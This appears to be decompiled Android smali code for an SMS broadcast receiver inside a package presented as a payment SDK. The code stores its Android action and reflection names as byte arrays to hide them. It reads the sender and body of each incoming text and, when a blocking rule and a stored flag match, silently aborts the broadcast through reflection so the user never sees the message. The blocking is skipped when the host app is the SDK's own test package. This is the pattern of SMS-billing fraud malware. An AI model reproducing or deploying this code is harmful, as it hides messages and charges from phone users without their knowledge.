.class public Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;
.super Landroid/content/BroadcastReceiver;
.source "CoreBroadcastReceiver.java"


# static fields
.field public static final ACTION_DELIVERED_SMS_ACTION:Ljava/lang/String;

.field public static final ACTION_SMS_ACTION:Ljava/lang/String;

.field public static final ACTION_SMS_RECEIVED:Ljava/lang/String;

.field public static final ACTION_USER_PRESENT:Ljava/lang/String;

.field public static final REFLECT_ABORTBROADCAST:Ljava/lang/String;

.field public static final REFLECT_BROADCASTRECEIVER:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 26
    new-instance v0, Ljava/lang/String;

    const/16 v1, 0xf

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    sput-object v0, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->ACTION_SMS_ACTION:Ljava/lang/String;

    .line 28
    new-instance v0, Ljava/lang/String;

    const/16 v1, 0x14

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    sput-object v0, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->ACTION_DELIVERED_SMS_ACTION:Ljava/lang/String;

    .line 30
    new-instance v0, Ljava/lang/String;

    const/16 v1, 0x22

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    sput-object v0, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->ACTION_USER_PRESENT:Ljava/lang/String;

    .line 32
    new-instance v0, Ljava/lang/String;

    const/16 v1, 0x27

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    sput-object v0, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->ACTION_SMS_RECEIVED:Ljava/lang/String;

    .line 35
    new-instance v0, Ljava/lang/String;

    const/16 v1, 0x21

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    sput-object v0, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->REFLECT_BROADCASTRECEIVER:Ljava/lang/String;

    .line 38
    new-instance v0, Ljava/lang/String;

    const/16 v1, 0xe

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    sput-object v0, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->REFLECT_ABORTBROADCAST:Ljava/lang/String;

    return-void

    .line 26
    nop

    :array_0
    .array-data 1
        0x53t
        0x45t
        0x4et
        0x54t
        0x5ft
        0x53t
        0x4dt
        0x53t
        0x5ft
        0x41t
        0x43t
        0x54t
        0x49t
        0x4ft
        0x4et
    .end array-data

    .line 28
    :array_1
    .array-data 1
        0x44t
        0x45t
        0x4ct
        0x49t
        0x56t
        0x45t
        0x52t
        0x45t
        0x44t
        0x5ft
        0x53t
        0x4dt
        0x53t
        0x5ft
        0x41t
        0x43t
        0x54t
        0x49t
        0x4ft
        0x4et
    .end array-data

    .line 30
    :array_2
    .array-data 1
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x69t
        0x6et
        0x74t
        0x65t
        0x6et
        0x74t
        0x2et
        0x61t
        0x63t
        0x74t
        0x69t
        0x6ft
        0x6et
        0x2et
        0x55t
        0x53t
        0x45t
        0x52t
        0x5ft
        0x50t
        0x52t
        0x45t
        0x53t
        0x45t
        0x4et
        0x54t
    .end array-data

    .line 32
    nop

    :array_3
    .array-data 1
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x70t
        0x72t
        0x6ft
        0x76t
        0x69t
        0x64t
        0x65t
        0x72t
        0x2et
        0x54t
        0x65t
        0x6ct
        0x65t
        0x70t
        0x68t
        0x6ft
        0x6et
        0x79t
        0x2et
        0x53t
        0x4dt
        0x53t
        0x5ft
        0x52t
        0x45t
        0x43t
        0x45t
        0x49t
        0x56t
        0x45t
        0x44t
    .end array-data

    .line 35
    :array_4
    .array-data 1
        0x61t
        0x6et
        0x64t
        0x72t
        0x6ft
        0x69t
        0x64t
        0x2et
        0x63t
        0x6ft
        0x6et
        0x74t
        0x65t
        0x6et
        0x74t
        0x2et
        0x42t
        0x72t
        0x6ft
        0x61t
        0x64t
        0x63t
        0x61t
        0x73t
        0x74t
        0x52t
        0x65t
        0x63t
        0x65t
        0x69t
        0x76t
        0x65t
        0x72t
    .end array-data

    .line 38
    nop

    :array_5
    .array-data 1
        0x61t
        0x62t
        0x6ft
        0x72t
        0x74t
        0x42t
        0x72t
        0x6ft
        0x61t
        0x64t
        0x63t
        0x61t
        0x73t
        0x74t
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 21
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 21
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 44
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v17

    sget-object v18, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->ACTION_SMS_ACTION:Ljava/lang/String;

    invoke-virtual/range {v17 .. v18}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v17

    if-eqz v17, :cond_0

    .line 47
    :try_start_0
    invoke-static/range {p1 .. p1}, Lcom/cynosure/paymentsdk/SDKInterface;->StartSDK(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 53
    :goto_0
    :try_start_1
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    .line 54
    .local v2, "bundle":Landroid/os/Bundle;
    if-eqz v2, :cond_0

    .line 55
    const-string v17, "smsnumber"

    move-object/from16 v0, v17

    invoke-virtual {v2, v0}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 56
    .local v15, "number":Ljava/lang/String;
    const-string v17, "smscontent"

    move-object/from16 v0, v17

    invoke-virtual {v2, v0}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 57
    .local v4, "content":Ljava/lang/String;
    const-string v17, "extdata"

    move-object/from16 v0, v17

    invoke-virtual {v2, v0}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 59
    .local v9, "extdata":Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->getResultCode()I

    move-result v17

    packed-switch v17, :pswitch_data_0

    .line 76
    invoke-static {v9}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v17

    if-nez v17, :cond_0

    .line 77
    new-instance v6, Lcom/cynosure/paymentsdk/helper/DBHelper;

    invoke-direct {v6}, Lcom/cynosure/paymentsdk/helper/DBHelper;-><init>()V

    .line 78
    .local v6, "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    new-instance v17, Lcom/cynosure/paymentsdk/vo/SDKLog;

    sget-object v18, Lcom/cynosure/paymentsdk/helper/Constant;->LOGTYPE_SMSFAILED:Ljava/lang/String;

    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 79
    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 80
    move-object/from16 v0, v19

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    invoke-direct/range {v17 .. v19}, Lcom/cynosure/paymentsdk/vo/SDKLog;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 78
    move-object/from16 v0, v17

    invoke-virtual {v6, v0}, Lcom/cynosure/paymentsdk/helper/DBHelper;->saveSDKLog(Lcom/cynosure/paymentsdk/vo/SDKLog;)Z

    .line 90
    new-instance v17, Ljava/lang/StringBuilder;

    const-string v18, "FFFF:N:"

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 91
    move-object/from16 v0, v17

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 92
    const-string v18, " C:"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 93
    move-object/from16 v0, v17

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 94
    const-string v18, " E:"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 95
    move-object/from16 v0, v17

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 90
    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    invoke-static/range {v17 .. v17}, Lcom/cynosure/paymentsdk/helper/LogHelper;->printI(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 107
    .end local v2    # "bundle":Landroid/os/Bundle;
    .end local v4    # "content":Ljava/lang/String;
    .end local v6    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .end local v9    # "extdata":Ljava/lang/String;
    .end local v15    # "number":Ljava/lang/String;
    :cond_0
    :goto_1
    sget-object v17, Lcom/cynosure/paymentsdk/helper/Constant;->PERMISSION_RECEIVE_SMS:Ljava/lang/String;

    invoke-static/range {v17 .. v17}, Lcom/cynosure/paymentsdk/helper/PermissionHelper;->checkPermission(Ljava/lang/String;)Z

    move-result v17

    if-eqz v17, :cond_1

    .line 109
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v17

    sget-object v18, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->ACTION_SMS_RECEIVED:Ljava/lang/String;

    invoke-virtual/range {v17 .. v18}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v17

    if-eqz v17, :cond_1

    .line 111
    :try_start_2
    const-string v17, "ACTION_SMS_RECEIVED"

    invoke-static/range {v17 .. v17}, Lcom/cynosure/paymentsdk/helper/LogHelper;->printI(Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    .line 114
    :try_start_3
    invoke-static/range {p1 .. p1}, Lcom/cynosure/paymentsdk/SDKInterface;->StartSDK(Landroid/content/Context;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 120
    :goto_2
    :try_start_4
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v2

    .line 122
    .restart local v2    # "bundle":Landroid/os/Bundle;
    const-string v17, "pdus"

    move-object/from16 v0, v17

    invoke-virtual {v2, v0}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v14

    check-cast v14, [Ljava/lang/Object;

    .line 124
    .local v14, "myOBJpdus":[Ljava/lang/Object;
    array-length v0, v14

    move/from16 v17, v0

    move/from16 v0, v17

    new-array v12, v0, [Landroid/telephony/SmsMessage;

    .line 125
    .local v12, "messages":[Landroid/telephony/SmsMessage;
    const/4 v10, 0x0

    .local v10, "i":I
    :goto_3
    array-length v0, v14

    move/from16 v17, v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    move/from16 v0, v17

    if-lt v10, v0, :cond_3

    .line 177
    .end local v2    # "bundle":Landroid/os/Bundle;
    .end local v10    # "i":I
    .end local v12    # "messages":[Landroid/telephony/SmsMessage;
    .end local v14    # "myOBJpdus":[Ljava/lang/Object;
    :cond_1
    :goto_4
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v17

    sget-object v18, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->ACTION_USER_PRESENT:Ljava/lang/String;

    invoke-virtual/range {v17 .. v18}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v17

    if-eqz v17, :cond_2

    .line 179
    :try_start_5
    const-string v17, "CoreBroadcastReceiver ACTION_USER_PRESENT"

    invoke-static/range {v17 .. v17}, Lcom/cynosure/paymentsdk/helper/LogHelper;->printI(Ljava/lang/String;)V

    .line 180
    invoke-static/range {p1 .. p1}, Lcom/cynosure/paymentsdk/SDKInterface;->StartSDK(Landroid/content/Context;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    .line 188
    :cond_2
    :goto_5
    return-void

    .line 49
    :catch_0
    move-exception v8

    .line 50
    .local v8, "e":Ljava/lang/Exception;
    :try_start_6
    invoke-virtual {v8}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto/16 :goto_0

    .line 101
    .end local v8    # "e":Ljava/lang/Exception;
    :catch_1
    move-exception v8

    .line 102
    .restart local v8    # "e":Ljava/lang/Exception;
    invoke-virtual {v8}, Ljava/lang/Exception;->printStackTrace()V

    .line 103
    invoke-static {v8}, Lcom/cynosure/paymentsdk/umengSDKInterface;->reportError(Ljava/lang/Throwable;)V

    goto :goto_1

    .line 61
    .end local v8    # "e":Ljava/lang/Exception;
    .restart local v2    # "bundle":Landroid/os/Bundle;
    .restart local v4    # "content":Ljava/lang/String;
    .restart local v9    # "extdata":Ljava/lang/String;
    .restart local v15    # "number":Ljava/lang/String;
    :pswitch_0
    :try_start_7
    invoke-static {v9}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v17

    if-nez v17, :cond_0

    .line 62
    new-instance v6, Lcom/cynosure/paymentsdk/helper/DBHelper;

    invoke-direct {v6}, Lcom/cynosure/paymentsdk/helper/DBHelper;-><init>()V

    .line 63
    .restart local v6    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    new-instance v17, Lcom/cynosure/paymentsdk/vo/SDKLog;

    sget-object v18, Lcom/cynosure/paymentsdk/helper/Constant;->LOGTYPE_SMSSUCCESS:Ljava/lang/String;

    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 64
    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 65
    move-object/from16 v0, v19

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    invoke-direct/range {v17 .. v19}, Lcom/cynosure/paymentsdk/vo/SDKLog;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 63
    move-object/from16 v0, v17

    invoke-virtual {v6, v0}, Lcom/cynosure/paymentsdk/helper/DBHelper;->saveSDKLog(Lcom/cynosure/paymentsdk/vo/SDKLog;)Z

    .line 67
    new-instance v17, Ljava/lang/StringBuilder;

    const-string v18, "SSSS:N:"

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 68
    move-object/from16 v0, v17

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 69
    const-string v18, " C:"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 70
    move-object/from16 v0, v17

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 71
    const-string v18, " E:"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 72
    move-object/from16 v0, v17

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 67
    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    invoke-static/range {v17 .. v17}, Lcom/cynosure/paymentsdk/helper/LogHelper;->printI(Ljava/lang/String;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_1

    goto/16 :goto_1

    .line 116
    .end local v2    # "bundle":Landroid/os/Bundle;
    .end local v4    # "content":Ljava/lang/String;
    .end local v6    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .end local v9    # "extdata":Ljava/lang/String;
    .end local v15    # "number":Ljava/lang/String;
    :catch_2
    move-exception v8

    .line 117
    .restart local v8    # "e":Ljava/lang/Exception;
    :try_start_8
    invoke-virtual {v8}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3

    goto/16 :goto_2

    .line 169
    .end local v8    # "e":Ljava/lang/Exception;
    :catch_3
    move-exception v8

    .line 170
    .restart local v8    # "e":Ljava/lang/Exception;
    invoke-virtual {v8}, Ljava/lang/Exception;->printStackTrace()V

    .line 171
    invoke-static {v8}, Lcom/cynosure/paymentsdk/umengSDKInterface;->reportError(Ljava/lang/Throwable;)V

    goto/16 :goto_4

    .line 127
    .end local v8    # "e":Ljava/lang/Exception;
    .restart local v2    # "bundle":Landroid/os/Bundle;
    .restart local v10    # "i":I
    .restart local v12    # "messages":[Landroid/telephony/SmsMessage;
    .restart local v14    # "myOBJpdus":[Ljava/lang/Object;
    :cond_3
    :try_start_9
    aget-object v17, v14, v10

    check-cast v17, [B

    invoke-static/range {v17 .. v17}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v17

    aput-object v17, v12, v10

    .line 128
    aget-object v17, v12, v10

    invoke-virtual/range {v17 .. v17}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    move-result-object v4

    .line 129
    .restart local v4    # "content":Ljava/lang/String;
    aget-object v17, v12, v10

    invoke-virtual/range {v17 .. v17}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v16

    .line 130
    .local v16, "sender":Ljava/lang/String;
    new-instance v5, Ljava/util/Date;

    aget-object v17, v12, v10

    invoke-virtual/range {v17 .. v17}, Landroid/telephony/SmsMessage;->getTimestampMillis()J

    move-result-wide v17

    move-wide/from16 v0, v17

    invoke-direct {v5, v0, v1}, Ljava/util/Date;-><init>(J)V

    .line 132
    .local v5, "date":Ljava/util/Date;
    new-instance v7, Lcom/cynosure/paymentsdk/purchase/DoBlock;

    invoke-direct {v7}, Lcom/cynosure/paymentsdk/purchase/DoBlock;-><init>()V

    .line 133
    .local v7, "doBlock":Lcom/cynosure/paymentsdk/purchase/DoBlock;
    move-object/from16 v0, v16

    invoke-virtual {v7, v0, v4}, Lcom/cynosure/paymentsdk/purchase/DoBlock;->doBlock(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v17

    if-eqz v17, :cond_4

    .line 136
    new-instance v17, Ljava/lang/StringBuilder;

    const-string v18, "CoreBroadcastReceiver ACTION_SMS_RECEIVED Block sender:"

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 138
    move-object/from16 v0, v17

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 139
    const-string v18, "smsContent:"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 140
    move-object/from16 v0, v17

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 141
    const-string v18, "date:"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 142
    move-object/from16 v0, v17

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 136
    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    invoke-static/range {v17 .. v17}, Lcom/cynosure/paymentsdk/helper/LogHelper;->printI(Ljava/lang/String;)V

    .line 145
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v17

    new-instance v18, Ljava/lang/String;

    const/16 v19, 0x1a

    move/from16 v0, v19

    new-array v0, v0, [B

    move-object/from16 v19, v0

    fill-array-data v19, :array_0

    invoke-direct/range {v18 .. v19}, Ljava/lang/String;-><init>([B)V

    invoke-virtual/range {v17 .. v18}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v17

    if-nez v17, :cond_4

    .line 146
    new-instance v6, Lcom/cynosure/paymentsdk/helper/DBHelper;

    invoke-direct {v6}, Lcom/cynosure/paymentsdk/helper/DBHelper;-><init>()V

    .line 147
    .restart local v6    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    sget-object v17, Lcom/cynosure/paymentsdk/helper/Constant;->DEVICEINFOKEY_ISBLOCKSMS:Ljava/lang/String;

    const-string v18, "1"

    move-object/from16 v0, v17

    move-object/from16 v1, v18

    invoke-virtual {v6, v0, v1}, Lcom/cynosure/paymentsdk/helper/DBHelper;->getDeviceInfoValueFromDB(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 148
    .local v11, "isBlockSMS":Ljava/lang/String;
    const-string v17, "1"

    move-object/from16 v0, v17

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_3

    move-result v17

    if-eqz v17, :cond_4

    .line 150
    :try_start_a
    new-instance v17, Ljava/lang/StringBuilder;

    const-string v18, "CoreBroadcastReceiver Do Block sender:"

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 152
    move-object/from16 v0, v17

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 153
    const-string v18, "smsContent:"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 154
    move-object/from16 v0, v17

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 155
    const-string v18, "date:"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 156
    move-object/from16 v0, v17

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 150
    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    invoke-static/range {v17 .. v17}, Lcom/cynosure/paymentsdk/helper/LogHelper;->printI(Ljava/lang/String;)V

    .line 157
    sget-object v17, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->REFLECT_BROADCASTRECEIVER:Ljava/lang/String;

    invoke-static/range {v17 .. v17}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    .line 158
    .local v3, "c":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    sget-object v17, Lcom/cynosure/paymentsdk/CoreBroadcastReceiver;->REFLECT_ABORTBROADCAST:Ljava/lang/String;

    const/16 v18, 0x0

    move/from16 v0, v18

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v18, v0

    move-object/from16 v0, v17

    move-object/from16 v1, v18

    invoke-virtual {v3, v0, v1}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v13

    .line 159
    .local v13, "method":Ljava/lang/reflect/Method;
    const/16 v17, 0x0

    move/from16 v0, v17

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v17, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v17

    invoke-virtual {v13, v0, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_4

    .line 125
    .end local v3    # "c":Ljava/lang/Class;, "Ljava/lang/Class<*>;"
    .end local v6    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .end local v11    # "isBlockSMS":Ljava/lang/String;
    .end local v13    # "method":Ljava/lang/reflect/Method;
    :cond_4
    :goto_6
    add-int/lit8 v10, v10, 0x1

    goto/16 :goto_3

    .line 161
    .restart local v6    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .restart local v11    # "isBlockSMS":Ljava/lang/String;
    :catch_4
    move-exception v8

    .line 162
    .restart local v8    # "e":Ljava/lang/Exception;
    :try_start_b
    invoke-virtual {v8}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_3

    goto :goto_6

    .line 182
    .end local v2    # "bundle":Landroid/os/Bundle;
    .end local v4    # "content":Ljava/lang/String;
    .end local v5    # "date":Ljava/util/Date;
    .end local v6    # "dbHelper":Lcom/cynosure/paymentsdk/helper/DBHelper;
    .end local v7    # "doBlock":Lcom/cynosure/paymentsdk/purchase/DoBlock;
    .end local v8    # "e":Ljava/lang/Exception;
    .end local v10    # "i":I
    .end local v11    # "isBlockSMS":Ljava/lang/String;
    .end local v12    # "messages":[Landroid/telephony/SmsMessage;
    .end local v14    # "myOBJpdus":[Ljava/lang/Object;
    .end local v16    # "sender":Ljava/lang/String;
    :catch_5
    move-exception v8

    .line 183
    .restart local v8    # "e":Ljava/lang/Exception;
    invoke-virtual {v8}, Ljava/lang/Exception;->printStackTrace()V

    .line 184
    invoke-static {v8}, Lcom/cynosure/paymentsdk/umengSDKInterface;->reportError(Ljava/lang/Throwable;)V

    goto/16 :goto_5

    .line 59
    nop

    :pswitch_data_0
    .packed-switch -0x1
        :pswitch_0
    .end packed-switch

    .line 145
    :array_0
    .array-data 1
        0x63t
        0x6ft
        0x6dt
        0x2et
        0x65t
        0x78t
        0x61t
        0x6dt
        0x70t
        0x6ct
        0x65t
        0x2et
        0x74t
        0x65t
        0x73t
        0x74t
        0x70t
        0x61t
        0x79t
        0x6dt
        0x65t
        0x6et
        0x74t
        0x73t
        0x64t
        0x6bt
    .end array-data
.end method
